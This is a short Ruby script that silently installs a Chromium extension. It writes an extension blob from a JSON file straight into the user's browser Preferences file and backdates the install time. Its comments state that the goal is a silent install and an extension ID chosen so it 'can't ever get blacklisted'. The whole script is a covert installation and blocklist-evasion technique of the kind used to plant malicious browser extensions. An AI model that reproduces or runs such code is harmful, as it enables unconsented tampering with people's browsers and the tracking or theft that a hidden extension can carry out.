#This script installs a chrome extension silently
require 'rubygems'
require 'json'

#Take care of encoding or else JSON parser throws errors
Encoding.default_external = Encoding::UTF_8
#Generate a random extension ID so that it can't ever get blacklisted
extensionId="mohfoljjfbllnkbhpmifaanmocjkbdho"#(0...32).map{ ('a'..'z').to_a[rand(26)] }.join
#Read the extension's blob
json=JSON.parse(File.read("extension.json"));
#Open Preferences
prefFileName="/home/nemo/.config/chromium/Default/Preferences"
#Parse the preferences to JSON
prefJson=JSON.parse(File.read(prefFileName))
#Merge the extension blob to preferences
prefJson["extensions"]["settings"][extensionId]=json
installTime=prefJson["extensions"]["autoupdate"]["next_check"].to_i-1
puts installTime
json["install_time"]=installTime.to_s
#Write it all back
File.open(prefFileName, 'w') {|f| f.write(JSON.pretty_generate(prefJson))}
puts "#{extensionId} extension installed successfuly"
